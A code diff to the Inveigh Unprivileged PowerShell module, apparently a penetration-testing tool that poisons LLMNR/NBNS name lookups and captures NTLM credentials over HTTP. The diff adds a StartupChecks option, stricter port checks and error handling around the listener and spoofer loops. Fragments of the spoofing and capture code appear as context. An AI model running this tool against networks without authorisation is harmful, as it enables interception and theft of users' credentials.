@@ -160,6 +160,9 @@ Default = Unlimited: (Integer) Run time duration in minutes.
 .PARAMETER RunCount
 Default = Unlimited: (Integer) Number of captures to perform before auto-exiting.
 
+.PARAMETER StartupChecks
+Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.
+
 .PARAMETER ShowHelp
 Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
 
@@ -201,6 +204,7 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WPADEmptyFile = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
     [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$HTTPAuth = "NTLM",
     [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$WPADAuth = "NTLM",
@@ -234,6 +238,11 @@ param
 if ($invalid_parameter)
 {
     throw "$($invalid_parameter) is not a valid parameter."
+}
+
+if($inveigh.HTTP -or $inveigh.HTTPS)
+{
+    throw "You must stop stop other Inveigh HTTP/HTTPS listeners before running this module."
 }
 
 if($NBNSBruteForce -eq 'Y')
@@ -362,7 +371,10 @@ else
 $inveigh.status_queue.Add("Inveigh Unprivileged started at $(Get-Date -format 's')") > $null
 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Unprivileged started")])  > $null
 
-$firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
+if($StartupChecks -eq 'Y')
+{
+    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
+}
 
 if($firewall_status)
 {
@@ -380,7 +392,10 @@ if($firewall_status)
 
 if($LLMNR -eq 'Y')
 {
-    $LLMNR_port_check = netstat -anp UDP | findstr 0.0.0.0:5355
+    if($StartupChecks -eq 'Y')
+    {
+        $LLMNR_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
+    }
 
     if(!$LLMNR_port_check)
     {
@@ -475,11 +490,14 @@ else
 
 if($HTTP -eq 'Y')
 {
-    $HTTP_port_check += netstat -anp TCP | findstr 0.0.0.0:$HTTPPort
     
-    if($HTTPIP)
+    if($StartupChecks -eq 'Y')
     {
-        $HTTP_port_check += netstat -anp TCP | findstr $HTTPIP`:$HTTPPort
+        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"0.0.0.0:$HTTPPort "
+    }
+    elseif($HTTPIP -and $StartupChecks -eq 'Y')
+    {
+        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
     }
 
     if($HTTP_port_check)
@@ -785,7 +803,17 @@ $HTTP_scriptblock =
     }
 
     $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
-    $HTTP_listener.Start()
+    
+    try
+    {
+        $HTTP_listener.Start()
+    }
+    catch
+    {
+        $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting HTTP listener")
+        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting HTTP listener")])
+        break HTTP_listener_loop
+    }
 
     $HTTP_WWW_authenticate_header = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20 # WWW-Authenticate
     $run_count_NTLMv1 = $RunCount + $inveigh.NTLMv1_list.Count
@@ -1205,9 +1233,20 @@ $LLMNR_spoofer_scriptblock =
     $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
     $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
 
-    while($inveigh.unprivileged_running)
+    :LLMNR_spoofer_loop while($inveigh.unprivileged_running)
     {   
-        $LLMNR_request_data = $LLMNR_UDP_client.Receive([Ref]$LLMNR_listener_endpoint) # need to switch to async
+
+        try
+        {
+            $LLMNR_request_data = $LLMNR_UDP_client.Receive([Ref]$LLMNR_listener_endpoint) # need to switch to async
+        }
+        catch
+        {
+            $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting LLMNR spoofer")
+            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting LLMNR spoofer")])
+            break LLMNR_spoofer_loop
+        }
+
 
         if([System.BitConverter]::ToString($LLMNR_request_data[($LLMNR_request_data.Length - 4)..($LLMNR_request_data.Length - 3)]) -ne '00-1c') # ignore AAAA for now
         {
@@ -1291,9 +1330,20 @@ $NBNS_spoofer_scriptblock =
     $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
     $NBNS_UDP_client.Client.ReceiveTimeout = 5000
 
-    while($inveigh.unprivileged_running)
+    :NBNS_spoofer_loop while($inveigh.unprivileged_running)
     {
-        $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint) # need to switch to async
+        
+        try
+        {
+            $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint) # need to switch to async
+        }
+        catch
+        {
+            $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting NBNS spoofer")
+            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting NBNS spoofer")])
+            break NBNS_spoofer_loop
+        }
+
 
         if([System.BitConverter]::ToString($NBNS_request_data[10..11]) -ne '00-01')
         {
